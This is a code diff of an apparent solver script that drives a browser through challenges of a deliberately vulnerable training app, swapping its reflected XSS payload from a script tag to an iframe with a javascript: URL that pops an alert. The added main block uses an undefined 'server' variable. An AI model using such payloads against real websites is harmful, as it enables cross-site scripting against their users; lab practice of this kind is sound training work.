@@ -9,7 +9,7 @@ def get_browser():
 
 def open_xss1_alert(server, browser):
     print('Popping reflected XSS1 in browser...'),
-    xssurl = '{}/#/search?q=%3Cscript%3Ealert(%22XSS1%22)%3C%2Fscript%3E'.format(server)
+    xssurl = '{}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E'.format(server)
     browser.get(xssurl)
     # Sleep just to show the XSS alert
     sleep(3)
@@ -44,6 +44,10 @@ def solve_browser_challenges(server):
         print('Unknown Selenium exception. Have you added the Chromedriver to your PATH?\n{}'.format(repr(err)))
         return
     open_xss1_alert(server, browser)
-    travel_back_in_time(server, browser)
+    #travel_back_in_time(server, browser) # TODO
     take_screenshot_of_score_and_quit(server, browser)
     print('\n== BROWSER CHALLENGES COMPLETE ==\n')
+
+if __name__ == '__main__':
+    #server = 'http://localhost:3000'
+    solve_browser_challenges(server)
